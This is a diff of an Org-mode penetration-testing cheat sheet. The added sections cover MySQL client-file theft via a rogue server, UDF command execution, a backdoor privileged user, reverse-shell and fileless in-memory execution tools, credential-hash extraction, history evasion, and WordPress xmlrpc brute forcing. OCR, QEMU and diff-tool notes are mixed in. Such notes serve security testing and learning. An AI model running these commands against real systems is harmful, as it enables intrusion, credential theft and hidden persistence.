@@ -46,6 +46,7 @@
 **** Dig
       - By querying Google's NS:
         #+begin_src sh
+          # It might return the DNS server IP
           dig TXT +short o-o.myaddr.l.google.com @ns1.google.com
         #+END_src
 **** openssl s_client
@@ -416,7 +417,7 @@
      - Non-duplicated sites clean output - proxy
        #+begin_src sh
          gospider -s <url> -p http://<proxy:p> -d 0 --sitemap -w | awk '!x[$NF]++{print $NF}'
-         # Filter-> Prepend /<site>/~$NF&& to awk
+         # Filter-> Prepend $NF~/<site>/&& to awk
        #+end_src
      - Or with json + cookies - no subdomains:
        #+begin_src sh
@@ -854,6 +855,10 @@
          # Use addons: -s <addon.py>
          # Don't verify SSL: -k
          # Client obtain SSL: http://mitm.it
+
+         # cp ~/.mitmproxy/mitmproxy-ca-cert.pem
+         # /usr/local/share/ca-certificates/mit.crt
+         # update-ca-certificates
 
          # Vi movement | Commands:
          f # Regex of captures to show/edit
@@ -2150,7 +2155,7 @@
          # Patator - 650 req 3 threads - 5 req/s
          # rockyou.txt takes around 1h
          # For more edit multiprocessing maxsize
-         patator http_fuzz url='<path-to>/xmlrpc.php' header='Content-Type: text/xml' method='POST' auto_urlencode=0 body='PROG0' 0="/tmp/test.sh"  --allow-ignore-failures -x ignore:code='xxx' -x ignore:fgrep!='blogid' -x quit:fgrep='blogid'-t 3
+         patator http_fuzz url='<path-to>/xmlrpc.php' header='Content-Type: text/xml' method='POST' auto_urlencode=0 body='PROG0' 0="/tmp/test.sh"  --allow-ignore-failures -x ignore:code='xxx' -x ignore:fgrep!='blogid' -x quit:fgrep='blogid' -t 3
 
          # Create /tmp/test.sh with the following
          #!/bin/sh
@@ -2938,7 +2943,7 @@
       - [[https://sourceforge.net/projects/unluac/][Site]] - LUA 5.1+
       - Custom [[https://sourceforge.net/p/unluac/discussion/general/thread/402225f086/][opmaps]] might be required
         - Use the ~--opmap <op-file>~
-*** Template Engines
+*** Template Engines - SSTI
 **** Manual
 ***** Detection
       - Find GET, POST or URL path that react to user input
@@ -3267,7 +3272,7 @@
           # Patator - 650 req 3 threads - 5 req/s
           # rockyou.txt takes around 1h
           # For more edit multiprocessing maxsize
-          patator http_fuzz url='<path-to>/xmlrpc.php' header='Content-Type: text/xml' method='POST' auto_urlencode=0 body='PROG0' 0="/tmp/test.sh <dict>"  --allow-ignore-failures -x ignore:code='xxx' -x ignore:fgrep!='blogid' -x quit:fgrep='blogid'-t 3
+          patator http_fuzz url='<path-to>/xmlrpc.php' header='Content-Type: text/xml' method='POST' auto_urlencode=0 body='PROG0' 0="/tmp/test.sh <dict>"  --allow-ignore-failures -x ignore:code='xxx' -x ignore:fgrep!='blogid' -x quit:fgrep='blogid' -t 3
 
          # Create /tmp/test.sh with the following
           #!/usr/bin/env -S perl -pl
@@ -3303,8 +3308,14 @@
         #+begin_src sh
           # Try a https://postb.in/ as URL-FROM
           # URL-TO is: <site/127>/wordpress/?p=1
+          # Try find leaked IPs via the JSON API:
+          # - <url>/wp-json/wp/v2/posts
+          # - <url>/wp-json/wp/v2/pages
+          # - <url>/wp-json/wp/v2/media
+          # - /wp-json/wp/v2/posts/<id>/revisions
+          # - /wp-json/wp/v2/pages/<id>/revisions
           curl -d '<?xml version="1.0"?> <methodCall><methodName>pingback.ping</methodName><params><param><value> <string>URL-FROM</string> </value></param><param><value> <string>URL-TO</string> </value></param></params></methodCall>' -H 'Content-Type: text/xml' <url>/xmlrpc.php
-          # faultCode>0 means open URL-FROM port
+          # faultCode > 0 -> open URL-FROM port
         #+end_src
 ***** Privilege Escalation
 ****** Database
@@ -3593,7 +3604,7 @@
       #+begin_src sql
         SELECT name COLLATE <collation-name> FROM <table-name>
       #+end_src
-** MySQL
+** MySQL / MariaDB
 *** Connection
 **** Linux
 ***** mysql
@@ -3607,7 +3618,7 @@
           # -r        - Raw output
         #+end_src
 *** Enumeration
-    - List tables and system users
+    - List tables and system users:
       #+begin_src sql
         -- List all databases
         SHOW DATABASES;
@@ -3697,9 +3708,70 @@
       #+begin_src sql
         SELECT * FROM users INTO OUTFILE '/tmp/users.txt';
       #+end_src
+    - Write binary data:
+      #+begin_src sql
+        -- Try: SELECT CONVERT.. INTO OUTFILE <F>
+        CONVERT(unhex("<non-0x-hex>"), BINARY);
+
+        CONVERT(from_base64("<base64>"), BINARY);
+      #+end_src
     - Read file using function:
       #+begin_src sql
         SELECT LOAD_FILE('/tmp/users.txt');
+      #+end_src
+    - Send client local file to connected server:
+      #+begin_src sql
+        -- Connect victim client to attack server
+        CREATE table temp_file(line BLOB);
+
+        -- Load victim file into attacker server
+        LOAD DATA local INFILE "<victim-file>" INTO table temp_file FIELDS TERMINATED BY '\n';
+
+        SELECT * temp_file;
+
+        DROP table temp_file;
+      #+end_src
+    - Also try the [[https://github.com/rmb122/rogue_mysql_server][rogue_mysql_server]]
+*** RCE - Privilege Escalation
+**** User Defined Function - UDF
+     - Only MySQL v4-5 if running as root or priv
+     - In the ~exploitdb~ there are versions for Python 2 (EID 46249) and 3 (EID 50236)
+     - Manual - UDF [[https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql][compiled]] - [[https://github.com/sqlmapproject/udfhack][source]] - EID 1518:
+       #+begin_src sql
+         -- Check the user, permissions & version
+         SELECT USER(), CURRENT_USER(), CURRENT_ROLE(), VERSION();
+
+         -- Select a database
+         USE mysql;
+
+         -- Temporary table to store the data
+         -- Or try using CONVERT
+         CREATE table temp_udf(line BLOB);
+         INSERT INTO temp_udf VALUES(LOAD_FILE('<path/to/liblib_mysqludf>'));
+         -- Or try with LOAD DATA local INFILE
+
+         -- Find the plugin library
+         SHOW variables LIKE '%plugin%';
+
+         -- Create a UDF lib on the plugin lib
+         -- Try skip the temp table with CONVERT
+         SELECT * FROM temp_udf INTO dumpfile '<path-to-plugin-lib>/lib_mysqludf_sys.<ext>'
+
+         -- Load the UDF
+         CREATE function sys_exec RETURNS integer soname 'lib_mysqludf_sys.<ext>'
+
+         -- Execute commands
+         SELECT sys_exec('<system-cmd>');
+
+         -- Cleanup
+         DROP table temp_udf;
+       #+end_src
+*** Persistence
+    - Create new privileged user:
+      #+begin_src sql
+        CREATE USER backup IDENTIFIED BY 'backup';
+
+        GRANT SELECT,CREATE,DROP,UPDATE,DELETE,INSERT ON *.* TO backup identified BY 'backup' WITH GRANT OPTION;
       #+end_src
 ** T-SQL (MSSQL)
 *** Connection
@@ -4621,374 +4693,413 @@
         # Set require is not there by default:
         # var r=global.process.mainModule.require
       #+end_src
+** Tools
+*** XC
+    - [[https://github.com/xct/xc#setup][Site]] - Multipurpose nc-like rev-shell - Go
+      #+begin_src sh
+        # Create a listener
+        xc -l -p <port>
+
+        # Also starts by renaming to IP:port
+        mv xc xc_<ip>_<port>
+
+        xc_<ip>_<port>
+      #+end_src
 
 * System Enumeration
 ** Linux
-   - Prevent command logging:
-     #+begin_src sh
-       # Bash
-       echo $HISTFILE
-
-       export HISTFILE=/dev/null
-
-       # Zsh
-       # Also check HISTFILE
-       echo $HISTFILE
-
-       # Push a new history stack
-       fc -p
-
-       # Pop current history stack (deleting)
-       fc -P
-     #+end_src
-   - List environment variables:
-     #+begin_src sh
-       echo $USER
-
-       echo $HOME
-
-       echo $SHELL
-
-       echo $PWD
-
-       echo $PATH
-
-       # all
-       export
-
-       set
-
-       # Modify for all programs in shell
-       export VAR=<value>
-
-       # Make it permanent for current user
-       echo 'export VAR=<value>' >> ~/.bashrc
-     #+end_src
-   - Locate users that could be used for logging in:
-     #+begin_src sh
-       # Also check /etc/shadow
-       grep -v 'nologin\|false' /etc/passwd
-     #+end_src
-   - User identification:
-     #+begin_src sh
-       whoami
-
-       # User, Group, and Context ID
-       id -a
-
-       # Logged users
-       who
-
-       # Logged users - extra info
-       who -a
-
-       # Logged users + stats + login process
-       w
-     #+end_src
-   - Permissions identification:
-     #+begin_src sh
-       # Check if sudo is vulnerable in exploitdb
-       sudo -V
-
-       # Commands that can be run with sudo
-       # without password prompting
-       sudo -l
-       # Also note: env_keep+=LD_PRELOAD
-       # Exploit dirs with wildcards: /vuln/dir/*
-       # sudo /bin/sh /vuln/dir/../../tmp/root.sh
-
-       # Same but for all users
-       less /etc/sudoers
-
-       # Find files with the SUID flag:
-       find / \( -perm -4000 -o -perm -2000 \) -type f -ls 2>/dev/null
-       # See how to leverage them:
-       # https://gtfobins.github.io
-       # Use ldd to detect missing libraries
-
-       # Find folders with the S[UG]ID flags:
-       find / \( -perm -4000 -o -perm -2000 \) -type d -ls 2>/dev/null
-       # New files on such directories obtain
-       # the folder's S[UG]ID automatically
-
-       # Find everything else:
-       find / \( -perm -4000 -o -perm -2000 \) \! -type f \! -type d -ls 2>/dev/null
-       # Everything writable and executable
-       # can be injected with evil code
+*** General
+    - Prevent command logging:
+      #+begin_src sh
+        # Bash
+        echo $HISTFILE
+
+        export HISTFILE=/dev/null
+
+        # Zsh
+        # Also check HISTFILE
+        echo $HISTFILE
+
+        # Push a new history stack
+        fc -p
+
+        # Pop current history stack (deleting)
+        fc -P
+      #+end_src
+    - List environment variables:
+      #+begin_src sh
+        echo $USER
+
+        echo $HOME
+
+        echo $SHELL
+
+        echo $PWD
+
+        echo $PATH
+
+        # all
+        export
+
+        set
+
+        # Modify for all programs in shell
+        export VAR=<value>
+
+        # Make it permanent for current user
+        echo 'export VAR=<value>' >> ~/.bashrc
+      #+end_src
+    - Locate users that could be used for logging in:
+      #+begin_src sh
+        # Also check /etc/shadow
+        grep -v 'nologin\|false' /etc/passwd
+      #+end_src
+    - User identification:
+      #+begin_src sh
+        whoami
+
+        # User, Group, and Context ID
+        id -a
+
+        # Logged users
+        who
+
+        # Logged users - extra info
+        who -a
+
+        # Logged users + stats + login process
+        w
+      #+end_src
+    - Permissions identification:
+      #+begin_src sh
+        # Check if sudo is vulnerable in exploitdb
+        sudo -V
+
+        # Commands that can be run with sudo
+        # without password prompting
+        sudo -l
+        # Also note: env_keep+=LD_PRELOAD
+        # Exploit dirs with wildcards: /vuln/dir/*
+        # sudo /bin/sh /vuln/dir/../../tmp/root.sh
+
+        # Same but for all users
+        less /etc/sudoers
+
+        # Find files with the SUID flag:
+        find / \( -perm -4000 -o -perm -2000 \) -type f -ls 2>/dev/null
+        # See how to leverage them:
+        # https://gtfobins.github.io
+        # Use ldd to detect missing libraries
+
+        # Find folders with the S[UG]ID flags:
+        find / \( -perm -4000 -o -perm -2000 \) -type d -ls 2>/dev/null
+        # New files on such directories obtain
+        # the folder's S[UG]ID automatically
+
+        # Find everything else:
+        find / \( -perm -4000 -o -perm -2000 \) \! -type f \! -type d -ls 2>/dev/null
+        # Everything writable and executable
+        # can be injected with evil code
 
-       # Locate binaries with capabilities
-       getcap -r / 2>/dev/null
-       # CAP_SETUID allows privesc: GTFObins
-       # Caps are retained in subprocesses
+        # Locate binaries with capabilities
+        getcap -r / 2>/dev/null
+        # CAP_SETUID allows privesc: GTFObins
+        # Caps are retained in subprocesses
 
-       # Users with capabilities
-       less /etc/security/capability.conf
+        # Users with capabilities
+        less /etc/security/capability.conf
 
-       # Sevices with capabilities
-       grep -r 'AmbientCapabilities=' /etc/systemd
-       # Other interesting Caps for privesc:
-       # - CAP_SYS_ADMIN
-       # - CAP_SYS_PTRACE
-       # - CAP_SYS_MODULE
-       # - CAP_DAC_READ_SEARCH
-       # - CAP_DAC_OVERRIDE
-       # - CAP_CHOWN
-       # - CAP_FORMER
-       # - CAP_SETGID
-       # - CAP_SETFCAP
-       # - CAP_SETUID
-       # Caps that may aid in privesc:
-       # - CAP_KILL
-       # - CAP_NET_BIND_SERVICE
-       # - CAP_NET_RAW
-       # - CAP_NET_ADMIN + CAP_NET_RAW
-       # - CAP_LINUX_IMMUTABLE
-     #+end_src
-   - List OS and version:
-     #+begin_src sh
-       # All details
-       cat /proc/version
+        # Sevices with capabilities
+        grep -r 'AmbientCapabilities=' /etc/systemd
+        # Other interesting Caps for privesc:
+        # - CAP_SYS_ADMIN
+        # - CAP_SYS_PTRACE
+        # - CAP_SYS_MODULE
+        # - CAP_DAC_READ_SEARCH
+        # - CAP_DAC_OVERRIDE
+        # - CAP_CHOWN
+        # - CAP_FORMER
+        # - CAP_SETGID
+        # - CAP_SETFCAP
+        # - CAP_SETUID
+        # Caps that may aid in privesc:
+        # - CAP_KILL
+        # - CAP_NET_BIND_SERVICE
+        # - CAP_NET_RAW
+        # - CAP_NET_ADMIN + CAP_NET_RAW
+        # - CAP_LINUX_IMMUTABLE
+      #+end_src
+    - List OS and version:
+      #+begin_src sh
+        # All details
+        cat /proc/version
 
-       # Kernel details
-       uname -a
+        # Kernel details
+        uname -a
 
-       # Distro detail
-       cat /etc/issue
+        # Distro detail
+        cat /etc/issue
 
-       cat /etc/*-release
-       # Check the Dirty COW section
-     #+end_src
-   - Kernel hardening using [[https://github.com/slimm609/checksec.sh][checksec]]:
-     #+begin_src sh
-       ./checksec --kernel 2>/dev/null
-     #+end_src
-   - List scheduled tasks:
-     #+begin_src sh
-       # Current user
-       crontab -l
-       # Some systems may use cru
+        cat /etc/*-release
+        # Check the Dirty COW section
+      #+end_src
+    - Kernel hardening using [[https://github.com/slimm609/checksec.sh][checksec]]:
+      #+begin_src sh
+        ./checksec --kernel 2>/dev/null
+      #+end_src
+    - List scheduled tasks:
+      #+begin_src sh
+        # Current user
+        crontab -l
+        # Some systems may use cru
 
-       # System scheduled tasks
-       less /etc/crontab
+        # System scheduled tasks
+        less /etc/crontab
 
-       # Systemd timers
-       systemctl list-timers
-     #+end_src
-   - Find files/directories:
-     #+begin_src sh
-       ls -lah /
+        # Systemd timers
+        systemctl list-timers
+      #+end_src
+    - Find files/directories:
+      #+begin_src sh
+        ls -lah /
 
-       ls -lah /root
+        ls -lah /root
 
-       ls -lah /home
+        ls -lah /home
 
-       ls -lah /var
+        ls -lah /var
 
-       ls -lah /var/spool
+        ls -lah /var/spool
 
-       ls -lah /var/mail
+        ls -lah /var/mail
 
-       ls -lah /var/spool/mail
+        ls -lah /var/spool/mail
 
-       ls -lah /etc/security
+        ls -lah /etc/security
 
-       ls -lah /etc/init
+        ls -lah /etc/init
 
-       ls -lahd /etc/init
+        ls -lahd /etc/init
 
-       ls -lah /etc/init.d
+        ls -lah /etc/init.d
 
-       ls -lahd /etc/init.d
+        ls -lahd /etc/init.d
 
-       ls -lah /etc/rc.d
+        ls -lah /etc/rc.d
 
-       ls -lahd /etc/rc.d
+        ls -lahd /etc/rc.d
 
-       ls -lah /etc/rc.d/init.d
+        ls -lah /etc/rc.d/init.d
 
-       ls -lahd /etc/rc.d/init.d
+        ls -lahd /etc/rc.d/init.d
 
-       ls -lah /etc/systemd/system
+        ls -lah /etc/systemd/system
 
-       ls -lahd /etc/systemd/system
+        ls -lahd /etc/systemd/system
 
-       find /var/log -type f 2>/dev/null
+        find /var/log -type f 2>/dev/null
 
-       find /var/cache -type f 2>/dev/null
+        find /var/cache -type f 2>/dev/null
 
-       find /var/crash -type f 2>/dev/null
+        find /var/crash -type f 2>/dev/null
 
-       # Exclude paths
-       find /var/www \! -path /var/www/error/\* -type f 2>/dev/null
+        # Exclude paths
+        find /var/www \! -path /var/www/error/\* -type f 2>/dev/null
 
-       # Files owned by specific users/groups
-       find / \( -user adm -o -group adm \) -ls 2>/dev/null | grep -v ' /sys\| /proc'
+        # Files owned by specific users/groups
+        find / \( -user adm -o -group adm \) -ls 2>/dev/null | grep -v ' /sys\| /proc'
 
-       ls -lah /etc
+        ls -lah /etc
 
-       ls -lah /usr/src
+        ls -lah /usr/src
 
-       ls -lah /usr/local
+        ls -lah /usr/local
 
-       ls -lah /opt
+        ls -lah /opt
 
-       ls -lah /var/opt
+        ls -lah /var/opt
 
-       # Show the commands of the processes
-       find /proc -name cmdline -exec sh -c 'grep -qv "^ *$" {} && { echo; echo {} | sed "h;s/./-/gp;H;x"; cat {}; echo; }' \; 2>/dev/null
+        # Show the commands of the processes
+        find /proc -name cmdline -exec sh -c 'grep -qv "^ *$" {} && { echo; echo {} | sed "h;s/./-/gp;H;x"; cat {}; echo; }' \; 2>/dev/null
 
-       # All world writable files
-       find / -perm -o+w -type f \! -path /proc \! -path /sys 2>/dev/null
+        # All world writable files
+        find / -perm -o+w -type f \! -path /proc \! -path /sys 2>/dev/null
 
-       # Check if they are writable
-       ls -lahd /etc/ld.so.conf.d/
-       ls -lah /etc/ld.so.conf.d/
-     #+end_src
-   - Follow [[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#ldconfig][this]] if ld.so.conf can be modified
-   - Check udev rules:
-     #+begin_src sh
-       ls -lah /etc/udev/rules.d
-       ls -lahd /etc/udev/rules.d
-     #+end_src
-   - List disk/partitions:
-     #+begin_src sh
-       ls /dev
+        # Check if they are writable
+        ls -lahd /etc/ld.so.conf.d/
+        ls -lah /etc/ld.so.conf.d/
+      #+end_src
+    - Follow [[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#ldconfig][this]] if ld.so.conf can be modified
+    - Check udev rules:
+      #+begin_src sh
+        ls -lah /etc/udev/rules.d
+        ls -lahd /etc/udev/rules.d
+      #+end_src
+    - List disk/partitions:
+      #+begin_src sh
+        ls /dev
 
-       ls /dev/mapper
+        ls /dev/mapper
 
-       # List partitions
-       fdisk -l /dev/sda
+        # List partitions
+        fdisk -l /dev/sda
 
-       blkid /dev/sda
+        blkid /dev/sda
 
-       cat /proc/partitions
+        cat /proc/partitions
 
-       # Mounted
-       mount
+        # Mounted
+        mount
 
-       cat /etc/mtab
+        cat /etc/mtab
 
-       cat /etc/fstab
-
-       cat /proc/mounts
-
-       # Swap
-       swapon
-
-       cat /proc/swaps
-     #+end_src
-   - Mount partitions:
-     #+begin_src sh
-       # Requires root
-       mount /dev/sda2 <path>
-
-       # Doesn't require
-       udisksctl mount -b /dev/sda2 <path>
-     #+end_src
-   - Host and Domain identification:
-     #+begin_src sh
-       # hostname
-       hostname
+        cat /etc/fstab
 
-       # Long hostname
-       hostname -f
+        cat /proc/mounts
 
-       # IPs for the hostname
-       hostname -i
+        # Swap
+        swapon
 
-       # NIS/YP Domain
-       hostname -y
+        cat /proc/swaps
+      #+end_src
+    - Mount partitions:
+      #+begin_src sh
+        # Requires root
+        mount /dev/sda2 <path>
 
-       domainname
+        # Doesn't require
+        udisksctl mount -b /dev/sda2 <path>
+      #+end_src
+    - Host and Domain identification:
+      #+begin_src sh
+        # hostname
+        hostname
 
-       nisdomainname
+        # Long hostname
+        hostname -f
 
-       ypdomainname
+        # IPs for the hostname
+        hostname -i
 
-       # DNS domain
-       hostname -d
+        # NIS/YP Domain
+        hostname -y
 
-       dnsdomainname
-     #+end_src
-   - Get the interfaces:
-     #+begin_src sh
-       # Modern systems
-       ip addr
+        domainname
+
+        nisdomainname
 
-       # Not so modern
-       ifconfig
+        ypdomainname
 
-       # Old systems
-       netstat -ie
-     #+end_src
-   - Check the routing table:
-     #+begin_src sh
-       # Modern systems
-       ip route
+        # DNS domain
+        hostname -d
 
-       # Not so modern
-       route
+        dnsdomainname
+      #+end_src
+    - Get the interfaces:
+      #+begin_src sh
+        # Modern systems
+        ip addr
 
-       # Old systems
-       netstat -r
-     #+end_src
-   - Check the DNSs:
-     #+begin_src sh
-       cat /etc/resolv.conf
-     #+end_src
-   - Check the hosts:
-     #+begin_src sh
-       cat /etc/hosts
-     #+end_src
-   - Check the ARP table:
-     #+begin_src sh
-       arp
+        # Not so modern
+        ifconfig
 
-       # BSD format
-       arp -a
+        # Old systems
+        netstat -ie
+      #+end_src
+    - Check the routing table:
+      #+begin_src sh
+        # Modern systems
+        ip route
 
-       # Numeric output
-       arp -n
-     #+end_src
-   - Check the sockets:
-     #+begin_src sh
-       # Modern systems
-       ss -tulnp
+        # Not so modern
+        route
 
-       # Old systems
-       netstat -anop
-     #+end_src
-   - Check the firewall rules:
-     #+begin_src sh
-       iptables --list
-       # Modern systems may use nftables
-     #+end_src
-   - List running processes:
-     #+begin_src sh
-       ps aux | less
-       # ps w in some systems
-     #+end_src
-   - List drivers:
-     #+begin_src sh
-       lsmod
+        # Old systems
+        netstat -r
+      #+end_src
+    - Check the DNSs:
+      #+begin_src sh
+        cat /etc/resolv.conf
+      #+end_src
+    - Check the hosts:
+      #+begin_src sh
+        cat /etc/hosts
+      #+end_src
+    - Check the ARP table:
+      #+begin_src sh
+        arp
 
-       less /proc/modules
-     #+end_src
-   - CPU and memory info:
-     #+begin_src sh
-       less /proc/cpuinfo
+        # BSD format
+        arp -a
 
-       less /proc/meminfo
+        # Numeric output
+        arp -n
+      #+end_src
+    - Check the sockets:
+      #+begin_src sh
+        # Modern systems
+        ss -tulnp
 
-       # Stats
-       cat /proc/uptime
+        # Old systems
+        netstat -anop
+      #+end_src
+    - Check the firewall rules:
+      #+begin_src sh
+        iptables --list
+        # Modern systems may use nftables
+      #+end_src
+    - List running processes:
+      #+begin_src sh
+        ps aux | less
+        # ps w in some systems
+      #+end_src
+    - List drivers:
+      #+begin_src sh
+        lsmod
 
-       less /proc/stat
+        less /proc/modules
+      #+end_src
+    - CPU and memory info:
+      #+begin_src sh
+        less /proc/cpuinfo
 
-       less /proc/vmstat
+        less /proc/meminfo
 
-       less /proc/misc
-     #+end_src
+        # Stats
+        cat /proc/uptime
+
+        less /proc/stat
+
+        less /proc/vmstat
+
+        less /proc/misc
+      #+end_src
+*** MySQL / MariaDB
+    - Files with creds/hashes:
+      #+begin_src sh
+        # debian-sys-maint plaintext passwords
+        less /etc/mysql/debian.cnf
+
+        # Extract user hashes (mysql.user ones)
+        grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
+      #+end_src
+    - General files:
+      #+begin_src sh
+        ls -lah ~/.mysql.history*
+
+        ls -lah /etc/my.cnf*
+
+        ls -lah /etc/mysql/my.cnf*
+
+        ls -lah /var/lib/mysql/my.cnf*
+
+        ls -lah ~/.my.cnf*
+
+        ls -lah /etc/my.cnf*
+
+        # Logs - try under /var/log
+        find / \( -name "connections.log" -o -name "update.log" -o "common.log" \) -type f -ls 2>/dev/null
+      #+end_src
 ** Windows
 *** cmd.exe
     - List [[https://docs.microsoft.com/en-us/windows/deployment/usmt/usmt-recognized-environment-variables][environment variables]]:
@@ -5676,6 +5787,34 @@
          echo Set objShell = Nothing >> zip.vbs
          echo Set fso = Nothing >> zip.vbs
        #+end_src
+** Comparison
+*** Pkgdiff
+    - [[https://github.com/lvc/pkgdiff][Site]] - Diff text files in archives/dirs
+      #+begin_src sh
+        pkgdiff -ignore-space-change -ignore-all-space -ignore-blank-lines -hide-unchanged -list-added-removed <tar-a> <tar-b>
+        # -d       - Treat <tar-a> <tar-b> as dir
+        # -details - C/C++ specific analysis
+
+        # Open all diffs - ZSH expansion
+        for f (pkgdiff_reports/**/diffs/**/*.html) xdg-open "$f"
+      #+end_src
+*** diffoscope
+    - [[https://diffoscope.org/][Site]] - [[https://try.diffoscope.org/][Online]] - Diff files, binaries, etc
+      #+begin_src sh
+        diffoscope --no-default-limits --extended-filesystem-attributes --html <out.html> <tar-a> <tar-b>
+        # --difftool <tool> - Diffs tools (delta)
+
+        # Recommended to install via docker (2GB)
+        docker run -it --rm -v <mount:point>:ro registry.salsa.debian.org/reproducible-builds/diffoscope
+
+        # Default `pip install diffoscope' only
+        # shows the diff of ls dates and perms
+        # Min reqs: file and libarchive
+
+        # Note: `pip install trydiffoscope' needs
+        # requests
+        trydiffoscope --webbrowser <a> <b>
+      #+end_src
 ** Recovery
 *** Ext4
 **** ext4magic
@@ -7604,7 +7743,74 @@
      #+begin_src sh
        python -c 'import os; os.setuid(0); os.system("/bin/bash");'
      #+end_src
+** Virtual Machine
+*** x64
+**** Blink
+     - [[https://github.com/jart/blink][Site]] - Tiny [[roam:https://github.com/jart/cosmopolitan][Portable]] VM for x64 ELF bins
+       #+begin_src sh
+         ./configure
+         make -j8 MODE=tiny
 
+         strip o/tiny/blink/blink
+
+         o/tiny/blink/blink <path-to-bin>
+         # Might need the LD_LIBRARY_PATH
+       #+end_src
+** Run ELF From Memory
+*** Perl
+    - Invoking the system call ~memfd_create~ followed by ~execve~:
+      #+begin_src sh
+        # From stdin
+        perl -e '$fd=syscall(319,$name="test",1);open FD,">&$fd";print FD<STDIN>;exec"/proc/self/fd/$fd","-lah"' < /bin/ls
+        # memfd_create is syscall 319 in x64
+
+        # Or, from file (if no exec permissions)
+        perl -e '$fd=syscall(319,$name="test",1);open FD,">&=$fd";open LS,"</bin/ls";print FD<LS>;exec"/proc/self/fd/$fd","-lah"'
+
+        # Notes:
+        # - Duplicating the FD is a workaround
+        # - Naming the memfd is also a workaround
+        #
+        # 1 -> MFD_CLOEXEC -> O_CLOEXEC
+        # It is also possible to allocate the mem
+        # in huge pages with 4 -> MFD_HUGETLB
+      #+end_src
+    - Alternatively, you can resolve ~memfd_create~
+      #+begin_src sh
+        # First convert to header.h to header.ph
+        mkdir /tmp/ph
+        ( cd /usr/include && h2ph -ad /tmp/ph syscall.h )
+
+        # Use them for resolving memfd_create
+        perl -I/tmp/ph -e 'require"syscall.ph";$fd=syscall(&SYS_memfd_create,$name="test",1);open FD,">&=:raw",$fd;open LS,"<:raw","/bin/ls";print FD<LS>;exec"/proc/self/fd/$fd","-lah"'
+      #+end_src
+*** Memit
+    - [[https://github.com/liamg/memit][Site]] - Run remote file from memory - Go
+    #+begin_src sh
+      memit https://<site>/<bin> -- <args>
+    #+end_src
+*** elfexec
+    - [[https://github.com/abbat/elfexec][Site]] - Run binaries from pipe - C
+      #+begin_src sh
+      elfexec <args> < <bin>
+      #+end_src
+*** Memrun
+    - [[https://github.com/guitmz/memrun][Site]] - Same as above, no args - Go + ASM
+*** go-memexec
+    - [[https://github.com/amenzhinsky/go-memexec][Site]] - Library to run binaries from go vars
+** Utils
+*** Eget
+    - [[https://github.com/zyedidia/eget][Site]] - Easy download pre-build Github bins
+      #+begin_src sh
+        # Download + extract exa to tmp
+        eget ogham/exa --asset musl --to /tmp
+      #+end_src
+*** Exa
+    - [[https://github.com/ogham/exa][Site]] - Modern ~ls~ replacement
+      #+begin_src sh
+        # Recurse-show with ext attrs in a tree
+        exa --icons -@ -T .
+      #+end_src
 * Forensics
 ** Windows
 *** Registry Hives .dat files
@@ -7669,6 +7875,8 @@
          #
          # To render HTML check: Tool section
        #+end_src
+**** TODO PST
+     - [[https://www.five-ten-sg.com/libpst/][readpst]] - export PST to various formats
 ** TODO Linux
    - [[https://tho-le.medium.com/linux-forensics-some-useful-artifacts-74497dca1ab2][Read this article]]
 
@@ -8353,6 +8561,39 @@
       #+end_src
     - Create a new /Internal Network/ adapter and write the name (if not listed): ~intlab~
     - It might be needed to start the VMs in graphical mode to be able to manually connect to multiple ethernet adapters
+*** Convert IMG to stdout
+    - Using the ~vbox-img~ tool:
+      #+begin_src sh
+        vbox-img convert --srcfilename <file> --stdout --dstformat RAW
+      #+end_src
+** Qemu
+   - Start ISO over KVM - ~qemu-desktop~:
+     #+begin_src sh
+       # Load the kvm_intel/amd kernel modules
+       qemu-system-x86_64 -enable-kvm -device es1370 -nic user -device virtio-mouse-pci -device virtio-tablet-pci -device virtio-keyboard-pci -cpu host -serial none -parallel none -device virtio-vga-gl -display gtk,gl=on -m 4G -smp 4 -cdrom <path-to.iso>
+       # For HiDPI add video=<w>x<h> inside guest
+       # -display sdl,gl=on - Best if HiDPI video
+       # -device virtio-vga - Non accelerated
+       # -device virtio-vga-gl,xres=<w>,yres=<h>
+       #
+       # File Sharing
+       # ... <- Complete
+       # https://wiki.qemu.org/Documentation/9psetup
+       # ^ Unix only, check steps 8 and 9
+       # ... SMB alternative
+       # -nic user,id=nic0,smb=<local-dir> - Win
+       #
+       # Port forwarding <host>-:<guest>
+       # -nic user,hostfwd=tcp::222-:22[,hostfwd]
+       #
+       # -nic user equivalent: -net nic -net user
+       #
+       # -device es1370 -> emulated sound card
+       # -> qemu-system-x86_64 -soundhw help
+
+       # Add if needed for true randomness
+       # -object rng-random,id=rng0,filename=/dev/urandom -device virtio-rng-pci,rng=rng0
+     #+end_src
 ** Pip Cache
    - Purge ~pip~ cache and don't use it anymore
      #+begin_src sh
@@ -8473,11 +8714,18 @@
          # Uses Tesseract OCR engine
          ocrmypdf <input.pdf> <output.pdf>
          # -l <lang1+lang2>  - Add languages
-         # --jobs <n>        - Cores to use
+         # --jobs <n>        - Limit to N cores
          # --rotate-pages    - Fix misrotation
          # --deskew          - Fix crooked PDFs
          # --output-type <t> - PDF/A by default
          # --title "<title>" - Add a title
+         # --optimize 3      - Optimize for size
+         # -c                - Clean with unpaper
+         # -i                - Keep -c in out PDF
+         # -f                - Ignore all OCR
+         # -s                - Keep existing OCR
+         # --redo-ocr        - Redo old OCR layer
+         # --tesseract-oem 1 - Use specific mode
        #+end_src
 ** OCR
 *** Tesseract
@@ -8505,6 +8753,15 @@
         # Preserve color with
         # -sDEVICE=png16m -dTextAlphaBits=4
       #+end_src
+*** EasyOCR
+    - [[https://github.com/JaidedAI/EasyOCR][Site]] - PyTorch GPU OCR lib+tool ([[https://github.com/JaidedAI/EasyOCR/blob/master/easyocr/config.py#L29][langs]]):
+      #+begin_src sh
+        # Uses CUDA
+        MODULE_PATH=/tmp/EasyOCR easyocr -l <lang> --detail=0 --gpu=True <image.jpg/png>
+        # MODULE_PATH=<d> - Storage for downloads
+        # --detail=<0/1>  - Show extra info
+      #+end_src
+    - More options [[https://www.jaided.ai/easyocr/documentation/][here]]
 *** Ocrad
     - [[https://www.gnu.org/software/ocrad/][Site]] - [[https://ftp.gnu.org/gnu/ocrad/][Download]] - Non-lang dependant OCR:
       #+begin_src sh
